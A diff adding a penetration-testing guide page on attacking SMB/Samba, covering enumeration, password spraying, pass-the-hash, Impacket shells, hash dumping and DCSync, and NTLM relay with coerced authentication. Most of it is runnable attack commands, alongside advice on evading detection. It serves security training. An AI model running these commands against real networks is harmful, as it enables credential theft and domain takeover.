@@ -1,0 +1,704 @@
+---
+title: SMB - Ports 137/138(UDP), 139/445(TCP) (Samba/NetBIOS)
+description: Enumeration and attack methodology for SMB/Samba on ports 137-139 and 445, covering null sessions, share looting, credential spraying, code execution, hash dumping, and NTLM relay.
+openGraph:
+  title: "SMB - Ports 137/138(UDP), 139/445(TCP) (Samba/NetBIOS)"
+  description: "Enumeration and attack methodology for SMB/Samba on ports 137-139 and 445, covering null sessions, share looting, credential spraying, code execution, hash dumping, and NTLM relay."
+  images:
+    - url: /imgs/smb.jpg
+      width: 1672
+      height: 941
+      alt: SMB - Ports 137/138(UDP), 139/445(TCP) (Samba/NetBIOS)
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "SMB - Ports 137/138(UDP), 139/445(TCP) (Samba/NetBIOS)"
+  description: "Enumeration and attack methodology for SMB/Samba on ports 137-139 and 445, covering null sessions, share looting, credential spraying, code execution, hash dumping, and NTLM relay."
+  images:
+    - url: /imgs/smb.jpg
+      width: 1672
+      height: 941
+      alt: SMB - Ports 137/138(UDP), 139/445(TCP) (Samba/NetBIOS)
+      type: image/jpeg
+---
+
+# SMB - Ports 137, 138, 139, 445 (Samba)
+
+import { Callout } from 'nextra/components'
+
+## Cheatsheet
+
+```bash
+nxc smb <SUBNET>/24 --generate-hosts-file hosts     # subnet sweep + hosts file
+nmap -sV -sC -p139,445 <IP>
+nmap --script "smb-vuln-*" -p445 <IP>
+nmap --script "smb-enum-*,smb-os-discovery,smb-security-mode,smb-protocols" -p445 <IP>
+
+nxc smb <IP> -u '' -p '' --shares                   # null session
+nxc smb <IP> -u 'guest' -p '' --shares              # guest session
+# Authenticated deep enumeration
+nxc smb <IP> -u <USER> -p <PASS> --shares --users --groups --pass-pol --loggedon-users --sessions --disks --rid-brute
+
+# Interacting
+smbclient -N -L //<IP>/ -U <user>%<pass>                             # list shares
+smbclient -U '<DOMAIN>\<USER>%<PASS>' //<IP>/<SHARE>
+smbmap -H <IP> -u <USER> -p <PASS> -R <SHARE>       # recursive listing
+smbmap -H <IP> -u <USER> -p <PASS> --download "<SHARE>/<FILE>"
+smbmap -H <IP> -u <USER> -p <PASS> --upload <FILE> "<SHARE>\<FILE>"
+
+# Automated enumeration 
+enum4linux-ng <IP> -A -u <USER> -p <PASS>
+
+# Spider all shares for interesting files
+nxc smb <IP> -u <USER> -p <PASS> -M spider_plus
+
+# Credential spray 
+nxc smb <IP> -u users.txt -p '<PASS>' --continue-on-success   # single-password spray
+
+# Pass-the-hash 
+nxc smb <IP> -u <USER> -H <HASH>
+
+# Command execution
+nxc smb <IP> -u <USER> -p <PASS> -x 'whoami /all'
+
+# Hash dumping
+nxc smb <IP> -u <USER> -p <PASS> --sam --lsa
+impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
+
+# Remote shells (stealth order: wmiexec > smbexec > psexec)
+impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<IP>         # quieter, no service creation
+impacket-psexec  <DOMAIN>/<USER>:<PASS>@<IP>         # SYSTEM, noisy (Event 7045)
+impacket-smbexec <DOMAIN>/<USER>:<PASS>@<IP>         # use when no writable share exists
+
+# NTLM relay (target signing must be off) + forced auth
+nxc smb <SUBNET>/24 --gen-relay-list relay-targets.txt
+sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks
+sudo responder -I <IFACE>                           # capture / poison to trigger auth
+```
+
+## Methodology
+
+### Phase 1: Fingerprint and Posture
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - What OS, hostname, domain, and SMB dialects is this host running?
+  - Is signing required, enabled-but-not-required, or disabled (the relay precondition)?
+  - Is SMBv1 present, putting EternalBlue (MS17-010)?
+  - Is the host domain-joined, meaning domain accounts and AD enumeration apply?
+  - Across the subnet, which hosts share posture worth grouping into one plan?
+</Callout>
+
+```bash
+nmap -sV -sC -p139,445 <IP>
+# One-line fingerprint 
+nxc smb <IP>
+# Subnet sweep 
+nxc smb <SUBNET>/24
+# Explicit signing + dialect detail
+nmap --script "smb-security-mode,smb-protocols" -p445 <IP>
+```
+
+- [ ] `nmap -sV -sC -p139,445 <IP>` capture OS, hostname, domain, NetBIOS name, signing requirement, supported dialects.
+- [ ] `nxc smb <IP>` one-line summary: `... (name:HOST) (domain:DOMAIN) (signing:False) (SMBv1:False)`. Note four fields: `signing:False` → relay possible *if* you can also coerce/capture auth; `SMBv1:True` → run `nmap --script smb-vuln-ms17-010 -p445 <IP>` immediately; non-empty `domain:` differing from hostname → domain-joined; `Server 2008/2003` → multiple legacy vulns likely.
+- [ ] `nxc smb <SUBNET>/24` the same fingerprint for every SMB host; the foundation of the whole internal engagement.
+- [ ] `nmap --script "smb-security-mode" -p445 <IP>` tells you whether signing is required, enabled-but-not-required, or disabled. The relay precondition is "not required".
+
+<Callout type="info">
+`signing:False` means relay is *possible*, not *available*. You still need a way to capture or coerce authentication from another user/machine to relay to this host: LLMNR/NBT-NS poisoning (Responder), IPv6 DNS spoofing (mitm6), coerced auth (PetitPotam/PrinterBug/DFSCoerce), or UNC-path injection into a document a victim opens. The finding is the trigger to build the relay chain in Phase 7, not a one-shot exploit.
+</Callout>
+
+### Phase 2: Null Session and Guest Enumeration
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Does the host permit a null session, guest access, or both (they are separate code paths)?
+  - Can I list shares and read any of them without credentials?
+  - Is the SAMR pipe anonymously accessible, enabling RID cycling for the full user list?
+  - What password policy applies, so I know whether spraying later is safe?
+  - Is this a Samba host with `map to guest = bad user` (any wrong credential silently maps to guest)?
+</Callout>
+
+```bash
+# Null session vs guest 
+nxc smb <IP> -u '' -p '' --shares
+nxc smb <IP> -u 'guest' -p '' --shares
+smbclient -N -L //<IP>/
+# RID cycling through the null session
+nxc smb <IP> -u '' -p '' --rid-brute
+# Password policy before any future spray
+nxc smb <IP> -u '' -p '' --pass-pol
+# Manual RPC enumeration
+rpcclient -N -U "" <IP>     # then: enumdomusers / enumdomgroups / getdompwinfo
+# Automated null-session sweep
+enum4linux-ng <IP> -A
+```
+
+- [ ] `nxc smb <IP> -u '' -p '' --shares` and `nxc smb <IP> -u 'guest' -p '' --shares` null vs guest. Servers can permit one and deny the other; test both. Cross-check with `smbclient -N -L //<IP>/`.
+- [ ] `nxc smb <IP> -u '' -p '' --rid-brute` RID cycling through the null session. The single most valuable null-session command: enumerates every domain account by walking SIDs. On a misconfigured DC this returns the entire user list with no credentials.
+- [ ] `nxc smb <IP> -u '' -p '' --pass-pol` lockout threshold, observation window, and complexity, *before* you spray.
+- [ ] `rpcclient -N -U "" <IP>` → `enumdomusers`, `enumdomgroups`, `querydominfo`, `getdompwinfo` manual RPC enumeration when nxc misbehaves.
+- [ ] `enum4linux-ng <IP> -A` automated null-session enumeration in one command; JSON output (`-oJ`) is excellent for reporting.
+
+
+### Phase 3: Share Loot
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which shares are readable, and what do their names imply (NETLOGON, SYSVOL, Backups, IT, Profiles)?
+  - Are high-value shares present even if hidden from the listing?
+  - What credential material lives in the files keys, configs, scripts, unattend/sysprep XML, GPP cpassword?
+  - Which shares are WRITABLE, and does any writable path map to a web root, cron/scheduled-task dir, or home dir?
+  - What does `IPC$` actually give me (transport, not files)?
+</Callout>
+
+```bash
+# Spider every share, index names/sizes, grep the JSON
+nxc smb <IP> -u <USER> -p <PASS> -M spider_plus -o EXCLUDE_EXTS=ico,lnk,url DOWNLOAD_FLAG=False
+cat ~/.nxc/modules/spider_plus/<IP>.json | jq '.[] | select(.size < 1048576) | .path'
+# smbmap recursive content search
+smbmap -H <IP> -u <USER> -p <PASS> -R --depth 5 -A '(passw|cred|secret|key|conf|sql|bak)'
+# Connect to a specific share
+smbclient -U '<DOMAIN>\<USER>%<PASS>' //<IP>/<SHARE>
+# DC-only: GPP cpassword in SYSVOL
+nxc smb <DC> -u <USER> -p <PASS> -M gpp_password
+```
+
+- [ ] For every readable share, enumerate recursively with `spider_plus`, then grep the JSON output for small high-value files.
+- [ ] Always check high-value share names even if absent from the listing some are hidden but directly connectable: `ADMIN$`/`C$` (access = admin), `NETLOGON`/`SYSVOL` (DC only mine logon scripts and GPO XML for credentials), and custom names (`Backups`, `IT`, `Profiles`, `Users`, `HR`, `Finance`). `IPC$` is the named-pipe transport, never a file target.
+- [ ] Hunt file-name patterns (`passw*`, `cred*`, `*.kdbx`, `id_rsa`, `*.pem`, `*.ppk`, `unattend*.xml`, `web.config`, `*.bak`) and content patterns (`password`, `connectionstring`, `aws_access_key_id`, `bearer`).
+- [ ] For each WRITE-capable share, note the path. Writable shares mapped to web roots, cron-watched dirs, scheduled-task script paths, or home directories are direct paths to code execution. Confirm with a marker file.
+
+<Callout type="info">
+`IPC$` is the named-pipe share, not a file share do not try to `ls` it. It is the transport for RPC (SAMR, lsarpc, srvsvc) that the rest of enumeration flows over. Access to `IPC$` is what *enables* RID cycling, `rpcclient`, and `impacket-lookupsid`, not a target in itself.
+</Callout>
+
+### Phase 4: Credential Validation and Spraying
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - What is the lockout threshold and observation window ?is spraying safe at all?
+  - Which credentials have I already harvested anywhere that should be reused first?
+  - Is single-password spraying (safe) better here than per-user wordlists (lockout risk)?
+  - Could a working credential be a *local* account (`--local-auth`) reused across the subnet?
+  - What is the OPSEC cost how many 4625 events will this generate, and from what source?
+</Callout>
+
+```bash
+# Always check policy first
+nxc smb <IP> -u '' -p '' --pass-pol
+# Single-password spray (safest pattern in AD)
+nxc smb <IP> -u users.txt -p '<PASS>' --continue-on-success
+# Username = password (lazy-admin pattern)
+nxc smb <IP> -u users.txt -p users.txt --no-bruteforce
+# Credential reuse across the subnet (try --local-auth for local accounts)
+nxc smb <SUBNET>/24 -u <USER> -p <PASS> --continue-on-success
+nxc smb <SUBNET>/24 -u Administrator -H <HASH> --local-auth
+```
+
+- [ ] **Check policy first**: `nxc smb <IP> -u '' -p '' --pass-pol`. Threshold 0 → spray freely (common on appliances/small Samba). Threshold 5+ with a 30-min window → max 4 attempts per user per 30 minutes.
+- [ ] **Single-password spray** (safest in AD): `nxc smb <IP> -u users.txt -p '<PASS>' --continue-on-success`. Try `Welcome1`, `Password123`, `Summer2025!`, `<Company>123`.
+- [ ] **Username = password** spray: `nxc smb <IP> -u users.txt -p users.txt --no-bruteforce` (matches line-for-line).
+- [ ] **Credential reuse**  every credential found anywhere else, across the whole subnet: `nxc smb <SUBNET>/24 -u <USER> -p <PASS>` and `--local-auth` if it may be a local account. A single working credential against `/24` reveals every host that accepts it.
+- [ ] If you only have NTLM hashes: `nxc smb <SUBNET>/24 -u Administrator -H <HASH> --local-auth` local admin password reuse is the most common Windows lateral-movement path.
+
+<Callout type="warning">
+**OPSEC:** Every failed SMB auth generates Security Event 4625; spraying a `/24` produces a wave of 4625s from one source IP trivial to alert on, and Defender for Identity flags spray patterns in seconds. Always check policy first, prefer single-password spray, prefer credential reuse over blind brute force, and keep volume below 4–5 attempts per user per observation window.
+</Callout>
+
+### Phase 5: Authenticated Deep Enumeration
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - With this credential, what shares, users, groups, sessions, and logged-on users are now visible?
+  - Which accounts are interactively logged on right now (credential-dump and hijack targets)?
+  - What do the AD privilege-escalation paths from this user look like (BloodHound)?
+  - Are there SYSVOL GPP cpasswords or NTLMv1 weaknesses to exploit?
+  - Does `nxc` report `Pwn3d!` anywhere, indicating local admin?
+</Callout>
+
+```bash
+# Kitchen-sink authenticated enumeration
+nxc smb <IP> -u <USER> -p <PASS> --shares --users --groups --pass-pol --loggedon-users --sessions --disks --rid-brute
+# Full RPC enumeration
+rpcclient -U '<DOMAIN>\<USER>%<PASS>' <IP>
+# AD attack-path collection
+bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c All --zip
+# SYSVOL GPP cpassword + NTLMv1 check
+nxc smb <DC> -u <USER> -p <PASS> -M gpp_password
+nxc smb <IP> -u <USER> -p <PASS> -M ntlmv1
+```
+
+- [ ] `nxc smb <IP> -u <USER> -p <PASS> --shares --users --groups --pass-pol --loggedon-users --sessions --disks --rid-brute` comprehensive authenticated enumeration. `--loggedon-users` reveals who is interactively logged on now (dump/hijack targets); `--sessions` shows active SMB sessions.
+- [ ] `rpcclient -U '<DOMAIN>\<USER>%<PASS>' <IP>` → `enumdomusers`, `enumdomgroups`, `queryuser <RID>`, `getdompwinfo`.
+- [ ] `bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c All --zip` reveals every privilege-escalation path from this user to Domain Admin.
+- [ ] `nxc smb <DC> -u <USER> -p <PASS> -M gpp_password` (SYSVOL GPP cpasswords) and `-M ntlmv1` (downgradeable, crackable via crack.sh).
+
+### Phase 6: Code Execution and Hash Dumping
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Do I have local admin (`Pwn3d!`), and which execution method has the best OPSEC for this target?
+  - What can I dump SAM, LSA secrets, cached creds, DPAPI, or full NTDS.dit on a DC?
+  - Does the local Administrator hash unlock other hosts via reuse?
+  - If `Pwn3d!` came from an unprivileged domain user, which other workstations does that user likely admin?
+  - What evidence/telemetry will each action generate, and is EDR present?
+</Callout>
+
+```bash
+# Execution (stealth-priority order: dcomexec > wmiexec > atexec > smbexec > psexec)
+impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<IP>      # quieter, no service event
+impacket-psexec  <DOMAIN>/<USER>:<PASS>@<IP>      # SYSTEM, but Event 7045
+nxc smb <IP> -u <USER> -p <PASS> -x 'whoami /all'
+# Hash dumping
+impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>  # SAM + LSA + cached + DPAPI
+nxc smb <IP> -u <USER> -p <PASS> --sam --lsa
+nxc smb <IP> -u <USER> -p <PASS> -M lsassy        # remote LSASS dump (needs SeDebug)
+# DCSync (DC, or user with replication rights)
+impacket-secretsdump -just-dc <DOMAIN>/<USER>@<DC>
+# Local admin reuse across the subnet
+nxc smb <SUBNET>/24 -u Administrator -H <HASH> --local-auth
+```
+
+- [ ] With `Pwn3d!`, execute via the quietest viable method (dcomexec → wmiexec → atexec → smbexec → psexec; reverse for reliability).
+- [ ] Dump hashes with `impacket-secretsdump` or `nxc --sam --lsa`; use `-M lsassy` for remote LSASS only when SeDebug is available and EDR is absent.
+- [ ] On a DC or with DCSync rights: `impacket-secretsdump -just-dc <DOMAIN>/<USER>@<DC>` full NTDS.dit dump for every domain account. The win condition.
+- [ ] Always pass-the-hash the local Administrator NTLM across the subnet: `nxc smb <SUBNET>/24 -u Administrator -H <HASH> --local-auth`.
+
+### Phase 7: SMB Relay (When Signing Is Off)
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which targets have `signing:False` (the relay destinations)?
+  - What trigger will produce authentication passive poisoning, mitm6, or coerced auth?
+  - What does the *target protocol* let me do (SMB exec, LDAPS RBCD, MSSQL xp_cmdshell, ADCS ESC8)?
+  - Am I confusing capture-and-crack (Responder) with capture-and-forward (ntlmrelayx)?
+  - Can I keep relayed sessions alive as SOCKS proxies for reuse?
+</Callout>
+
+```bash
+# Identify relay targets
+nxc smb <SUBNET>/24 --gen-relay-list relay-targets.txt
+# Turn Responder's SMB/HTTP servers OFF so ntlmrelayx can bind them
+sudo sed -i 's/SMB = On/SMB = Off/;s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
+sudo responder -I <IFACE> -dwv
+# Relay listener (SOCKS keeps sessions alive)
+sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks
+# LDAPS RBCD path (relay coerced DC auth)
+sudo impacket-ntlmrelayx -t ldaps://<DC> --delegate-access --escalate-user <SACRIFICE_USER>
+# Coerce authentication from a target
+PetitPotam.py -u '' -p '' <LHOST> <TARGET>
+coercer.py coerce -u <USER> -p <PASS> -l <LHOST> -t <TARGET>
+```
+
+- [ ] `nxc smb <SUBNET>/24 --gen-relay-list relay-targets.txt` produces a clean list of every `signing:False` host.
+- [ ] Set up the listener: disable Responder's SMB+HTTP servers, start Responder for LLMNR/NBT-NS, then run `impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks`.
+- [ ] Trigger authentication (increasing reliability): wait for LLMNR/NBT-NS traffic; mitm6 IPv6 DNS spoofing; coerced auth (`PetitPotam.py`, `coercer.py`, `printerbug.py`); UNC-path injection.
+- [ ] Match outcome to target: relay to SMB (admin) → secretsdump/psexec; relay to LDAPS on a DC → `--delegate-access` writes RBCD on a target computer; relay to MSSQL → `xp_cmdshell`; relay to HTTP/ADCS → ESC8 certificate abuse.
+- [ ] Use `-socks` to keep relayed sessions alive as SOCKS proxies reuse via `proxychains nxc/secretsdump` without re-triggering auth.
+
+<Callout type="warning">
+Coerced auth produces a NetNTLMv2 challenge that is usually *not crackable* but it does not need to be. NTLM relay forwards the handshake to a target that accepts it; you never need cleartext. Do not confuse Responder's capture-and-crack mode with ntlmrelayx's capture-and-forward mode. For relay, turn Responder's SMB/HTTP servers OFF and let ntlmrelayx own those ports. You also cannot relay a machine account back to the same host (loopback relay was patched via CVE-2019-1166 and related fixes).
+</Callout>
+
+<Quiz
+  question="You find Host A (Server 2019, signing:True), Host B (Windows 10, signing:False), and Host C (Server 2016 DC, signing:True). You have an unprivileged domain user and confirm via PetitPotam that the DC machine account can be coerced. What is the highest-value relay chain?"
+  options={[
+    "Coerce DC -> relay to Host B (signing off) -> SMB code execution on Host B as the DC machine account",
+    "Coerce DC -> relay to LDAPS on a DC -> use --delegate-access to grant yourself RBCD on a chosen target computer",
+    "Coerce DC -> relay to SMB on the DC itself -> direct domain compromise",
+    "Coerce DC -> relay to MSSQL on a database server -> xp_cmdshell as the DC machine account"
+  ]}
+  answer={1}
+  explanation="Option 3 is impossible you cannot relay a machine account back to the same host (loopback relay was patched via CVE-2019-1166 and related fixes). Option 1 gives SMB execution on Host B as DC$, a strong but single-workstation pivot. Option 4 needs xp_cmdshell enabled and DC$ rights on the DB server uncommon. Option 2 is the win: relay the DC's coerced authentication to LDAPS and use ntlmrelayx's --delegate-access to write msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer object. That grants your controlled account Resource-Based Constrained Delegation over that target, letting you forge service tickets for any user (including Domain Admin) against it. RBCD via relayed coerced auth is the canonical modern path to domain compromise on networks with basic SMB hardening, because LDAPS does not require SMB signing and the DC machine account can modify computer objects."
+/>
+
+## Overview
+
+SMB (Server Message Block) is the core file-sharing and network-services protocol of the Windows ecosystem. It carries file shares, named pipes, RPC interfaces, printer access, and the authentication apparatus behind almost every other Windows service. Samba is the GPL Linux/Unix implementation of the same protocol family. From an attacker's perspective SMB is the most attack-surface-rich protocol on a Windows network and the single most important service to enumerate exhaustively on internal engagements.
+
+| Version | Released | Notes |
+|---------|----------|-------|
+| SMB 1.0 (CIFS) | 1996 / Windows NT | Legacy. EternalBlue/Romance/Champion. Disabled by default Windows 10 1709+ but still present on many hosts. |
+| SMB 2.0 | Vista / Server 2008 | Major redesign fewer commands, better performance. |
+| SMB 2.1 | Win 7 / Server 2008 R2 | Opportunistic locking, large MTU. |
+| SMB 3.0 | Win 8 / Server 2012 | Encryption, multichannel, RDMA. |
+| SMB 3.0.2 | Win 8.1 / Server 2012 R2 | Minor refinements. |
+| SMB 3.1.1 | Win 10 / Server 2016 | Pre-auth integrity, AES-128-GCM. SMBGhost (CVE-2020-0796) family. |
+
+### Ports
+
+| Port | Protocol | Service |
+|------|----------|---------|
+| 137/UDP | NetBIOS | Name service (NBNS) name resolution |
+| 138/UDP | NetBIOS | Datagram service |
+| 139/TCP | SMB over NetBIOS | Legacy SMB transport |
+| 445/TCP | SMB Direct | Modern SMB preferred everywhere |
+
+<Callout type="info">
+Port 445 is SMB without the NetBIOS layer. Port 139 is SMB over NetBIOS Session Service for backwards compatibility with pre-Windows-2000 clients. Modern Windows prefers 445; if both are open, target 445. If only 139 is open you are looking at a legacy host or unusual config  fingerprint carefully.
+</Callout>
+
+## Quick Reference
+
+```bash
+nxc smb <IP>                           # One-line fingerprint of SMB on a single host
+nxc smb <SUBNET>/24                    # Scan and fingerprint SMB on an entire subnet
+nxc smb <IP> --shares -u '' -p ''      # List SMB shares via null session (no credentials)
+nxc smb <IP> --shares -u 'guest' -p '' # Enumerate shares as the 'guest' user
+nxc smb <IP> -u '' -p '' --rid-brute   # RID cycling to enumerate users/groups with no creds
+nxc smb <IP> -u '' -p '' --pass-pol    # Dump password policy (null session)
+nxc smb <IP> -u <USER> -p <PASS> --shares --users --groups --pass-pol   # Full enum with creds
+smbclient -U '<USER>%<PASS>' //<IP>/<SHARE>           # Connect interactively to a share
+nxc smb <IP> -u <USER> -p <PASS> -M spider_plus        # Recursively spider all shares with creds
+nxc smb <IP> -u users.txt -p '<PASS>' --continue-on-success        # Spray single password across a user list, keep checking after a success
+nxc smb <SUBNET>/24 -u Administrator -H <HASH> --local-auth         # Sweep subnet for local admin hash reuse (pass-the-hash)
+impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>                    # Dump password hashes with valid creds
+impacket-secretsdump -just-dc <DOMAIN>/<USER>@<DC>                  # DCSync (replicate AD secrets) with appropriate rights
+impacket-psexec <DOMAIN>/<USER>:<PASS>@<IP>                         # Get SYSTEM shell via SMB and creds
+impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<IP>                        # Get stealthier shell (WMI) over SMB
+nxc smb <IP> -u <USER> -H <HASH>                                    # Authenticate and access SMB using NTLM hash (pass-the-hash)
+nxc smb <SUBNET>/24 --gen-relay-list relay.txt                      # Find all SMB hosts that can be relayed to (NTLM relay)
+PetitPotam.py -u '' -p '' <LHOST> <TARGET>                          # Coerce auth from <TARGET> host to <LHOST> 
+impacket-ntlmrelayx -tf relay.txt -smb2support -socks              # Start NTLM relay listener (relay target list, SOCKS proxy)
+```
+
+## Null Session vs Guest vs Anonymous
+
+These terms are used interchangeably but differ at the protocol level  servers can permit one and deny the others.
+
+| Term | Mechanism | What It Permits |
+|------|-----------|-----------------|
+| **Null session** | Empty username, empty password, empty domain | Access to `IPC$` and the named pipes behind it (SAMR, LSARPC, SRVSVC)  RID cycling, SAM enumeration, share listing |
+| **Guest** | Username = `guest`, no/any password | Access as the `Guest` local account  depends on whether Guest is enabled and its permissions |
+| **Anonymous** | Often a synonym for null session; in NTLM context, `Anonymous` as the username | Identical to null session on most servers |
+| **Map to guest** | Samba `map to guest = bad user`  invalid login → guest | Any wrong credential silently maps to guest, making the server appear to accept anything |
+
+When `nxc smb <IP> -u 'anything' -p 'random' --shares` works, you are probably hitting `map to guest = bad user` on Samba  every share with guest read access is fully exposed to anyone who can reach the port.
+
+## NetExec (nxc) Full Reference
+
+NetExec is the modern replacement for crackmapexec and the single most important tool in the SMB phase.
+
+```bash
+# Fingerprint
+nxc smb <IP>
+nxc smb <SUBNET>/24
+
+# Share enumeration
+nxc smb <IP> -u '' -p '' --shares
+nxc smb <IP> -u 'guest' -p '' --shares
+nxc smb <IP> -u <USER> -p <PASS> --shares
+nxc smb <IP> -u <USER> -p <PASS> --filter-shares READ,WRITE
+
+# User / group / session enumeration
+nxc smb <IP> -u '' -p '' --rid-brute
+nxc smb <IP> -u <USER> -p <PASS> --users --groups --loggedon-users --sessions --disks
+
+# Password policy
+nxc smb <IP> -u <USER> -p <PASS> --pass-pol
+
+# Credential attacks
+nxc smb <IP> -u users.txt -p '<PASS>' --continue-on-success
+nxc smb <IP> -u users.txt -p passwords.txt --no-bruteforce
+
+# Pass-the-hash
+nxc smb <IP> -u <USER> -H <HASH>
+nxc smb <SUBNET>/24 -u Administrator -H <HASH> --local-auth
+
+# Command execution (requires admin)
+nxc smb <IP> -u <USER> -p <PASS> -x 'whoami /all'
+nxc smb <IP> -u <USER> -p <PASS> --exec-method smbexec -x 'whoami'
+
+# Hash / credential dumps
+nxc smb <IP> -u <USER> -p <PASS> --sam --lsa
+nxc smb <IP> -u <USER> -p <PASS> --ntds                # NTDS.dit (DC only, requires DA)
+nxc smb <IP> -u <USER> -p <PASS> --dpapi
+nxc smb <IP> -u <USER> -p <PASS> -M lsassy
+
+# Useful modules
+nxc smb <DC> -u <USER> -p <PASS> -M gpp_password
+nxc smb <IP> -u <USER> -p <PASS> -M spider_plus
+nxc smb <IP> -u <USER> -p <PASS> -M ntlmv1
+nxc smb <DC> -u '' -p '' -M zerologon
+
+# Relay targets
+nxc smb <SUBNET>/24 --gen-relay-list relay.txt
+```
+## RPC Enumeration
+
+```bash
+# Null session
+rpcclient -N -U "" <IP>
+# Authenticated
+rpcclient -U '<DOMAIN>\<USER>%<PASS>' <IP>
+```
+
+| RPC Command | Purpose |
+|-------------|---------|
+| `srvinfo` | Server info, OS version |
+| `enumdomusers` | List every domain user |
+| `enumdomgroups` | List domain groups |
+| `enumalsgroups builtin` | List builtin groups (Administrators, etc.) |
+| `queryuser <RID>` | User detail (last logon, password set time, flags) |
+| `querygroupmem <RID>` | Group membership |
+| `getdompwinfo` | Password policy (complexity, length, history) |
+| `lookupnames <USER>` | Resolve username to SID |
+| `lookupsids <SID>` | Resolve SID to username |
+| `netshareenumall` | Enumerate all shares including hidden |
+
+### Manual RID Cycling
+
+When `nxc --rid-brute` is unavailable, the same effect via rpcclient:
+
+```bash
+for rid in $(seq 500 1100); do
+    rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x' $rid)" 2>/dev/null | \
+    grep -E "User Name|user_rid|Account Type" && echo "---"
+done
+```
+
+**Well-known RIDs:** 500 = local Administrator, 501 = Guest, 502 = krbtgt (DCs), 512 = Domain Admins, 513 = Domain Users, 519 = Enterprise Admins, 1000+ = locally created accounts (sequential).
+
+### RPC for Modifications
+
+`rpcclient` is not read-only. With a sufficiently privileged session and where the server permits the change through RPC  the same client can modify the target, not just enumerate it. These are post-compromise / privilege-leverage actions, not null-session moves:
+
+```bash
+# Reset a user's password (needs rights over the target account)
+rpcclient -U '<DOMAIN>\<USER>%<PASS>' <IP> -c "setuserinfo2 <TARGET_USER> 23 '<NEW_PASS>'"
+# Create a new domain user
+rpcclient -U '<DOMAIN>\<USER>%<PASS>' <IP> -c "createdomuser <NEW_USER>"
+# Create a new share (where the server allows srvsvc share management)
+rpcclient -U '<DOMAIN>\<USER>%<PASS>' <IP> -c "netsharadd <NAME> <PATH>"
+```
+
+## Impacket Toolkit
+
+```bash
+# Interactive SMB client
+impacket-smbclient <DOMAIN>/<USER>:<PASS>@<IP>
+
+# Hash dumping
+impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
+impacket-secretsdump -hashes :<HASH> <DOMAIN>/<USER>@<IP>
+impacket-secretsdump -just-dc <DOMAIN>/<USER>@<DC>             # NTDS.dit (DCSync)
+impacket-secretsdump -just-dc-user <USER> <DOMAIN>/<USER>@<DC> # specific user only
+
+# Shell execution variants
+impacket-psexec   <DOMAIN>/<USER>:<PASS>@<IP>     # SYSTEM via service creation (Event 7045)
+impacket-wmiexec  <DOMAIN>/<USER>:<PASS>@<IP>     # via WMI (no service)
+impacket-smbexec  <DOMAIN>/<USER>:<PASS>@<IP>     # via service named pipe
+impacket-atexec   <DOMAIN>/<USER>:<PASS>@<IP> 'cmd /c whoami'  # via task scheduler
+impacket-dcomexec <DOMAIN>/<USER>:<PASS>@<IP>     # via DCOM
+
+# RPC enumeration
+impacket-lookupsid anonymous@<IP>                # null-session lookupsid
+impacket-samrdump <IP>                           # SAM dump via SAMR
+impacket-rpcdump <IP>                            # RPC interface dump
+
+# Pass-the-hash for everything
+impacket-psexec  -hashes :<HASH> <USER>@<IP>
+impacket-wmiexec -hashes :<HASH> <USER>@<IP>
+```
+
+### How PsExec Works
+
+The original PsExec is a Sysinternals tool (now Microsoft-owned) that runs processes on remote systems with full console interactivity and no manual client install. The mechanism every implementation copies:
+
+1. It carries a Windows service binary embedded in the executable.
+2. It writes that service image to a writable share on the target `ADMIN$` by default which is why **local admin is required**.
+3. It binds the DCE/RPC interface over SMB to reach the Service Control Manager (SCM) API.
+4. It creates and starts the service on the target, running as SYSTEM.
+5. The service opens a named pipe, and commands/output stream back over that pipe.
+
+This is why psexec lands you as `nt authority\system` and why it is loud: a brand-new service appears in the SCM (Event 7045). The Impacket family reimplements this idea with variations `impacket-psexec` uses `RemComSvc`; `impacket-smbexec` skips the embedded service binary and stands up a local SMB server to catch output, useful when the target has **no writable share**; `impacket-atexec` runs the command through the Task Scheduler instead of the SCM. `nxc`/CrackMapExec wrap smbexec and atexec as `--exec-method`.
+
+### Execution Method OPSEC Comparison
+
+| Tool | Mechanism | Key Event ID | Detection Difficulty |
+|------|-----------|--------------|----------------------|
+| `impacket-psexec` | Creates a Windows service running a named-pipe shell | 7045, 4697, 4624 Type 3 | Easy  Event 7045 from `PSEXESVC` is famous |
+| `impacket-smbexec` | Service creation, less interactive | 7045, 4697 | Easy same signatures as psexec |
+| `impacket-wmiexec` | WMI process creation (Win32_Process.Create) | 4624 Type 3, 4688 | Medium no service event, but WMI logging catches it |
+| `impacket-atexec` | Schedules a task that runs a command | 4624 Type 3, 4698 | Medium ask creation events logged |
+| `impacket-dcomexec` | DCOM object instantiation | 4624 Type 3, 10000-series DCOM | Hard least logged, needs DCOM auditing |
+
+Stealth-priority order: **dcomexec → wmiexec → atexec → smbexec → psexec**. Reverse for reliability psexec almost always works; dcomexec depends on DCOM activation rights and the right COM object being available.
+
+## Pass-the-Hash
+
+Authenticate to a remote service using the NTLM hash directly, without the cleartext. It works because the NTLM challenge-response uses the hash itself as the secret.
+
+| Service | NTLM PtH Works? | Notes |
+|---------|-----------------|-------|
+| SMB (445) | **Yes** | The canonical target `nxc smb -u <USER> -H <HASH>` |
+| WinRM (5985/5986) | **Yes** | `evil-winrm -u <USER> -H <HASH> -i <IP>` |
